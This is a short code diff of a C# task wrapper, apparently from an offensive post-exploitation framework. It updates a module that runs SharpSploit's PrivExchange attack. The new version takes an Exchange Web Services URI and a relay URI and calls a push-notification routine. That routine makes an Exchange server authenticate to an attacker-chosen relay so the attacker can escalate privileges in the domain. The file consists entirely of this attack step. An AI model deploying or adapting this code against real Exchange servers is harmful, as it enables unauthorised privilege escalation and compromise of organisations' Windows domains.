@@ -1,12 +1,16 @@
 using System;
   
-using SharpSploit.Misc;
+using SharpSploit.PrivilegeEscalation;
 
 public static class Task
 {
-    public static string Execute(string targetHost, string attackerHost, string attackerPort, string attackerPage, string SSL, string exchangeVersion, string exchangePort)
+    public static string Execute(string EWSUri, string RelayUri, string ExchangeVersion = "Exchange2010")
     {
-        string results = PrivExchange.PushNotification(targetHost, attackerHost, attackerPort, attackerPage, SSL, exchangeVersion, exchangePort);
-        return results.ToString();
+        Exchange.ExchangeVersion version = (Exchange.ExchangeVersion) Enum.Parse(typeof(Exchange.ExchangeVersion), ExchangeVersion, true);
+        if (Exchange.PrivExchangePushNotification(EWSUri, RelayUri, version))
+        {
+            return "PrivExchange succeeded!";
+        }
+        return "PrivExchange failed.";
     }
 }
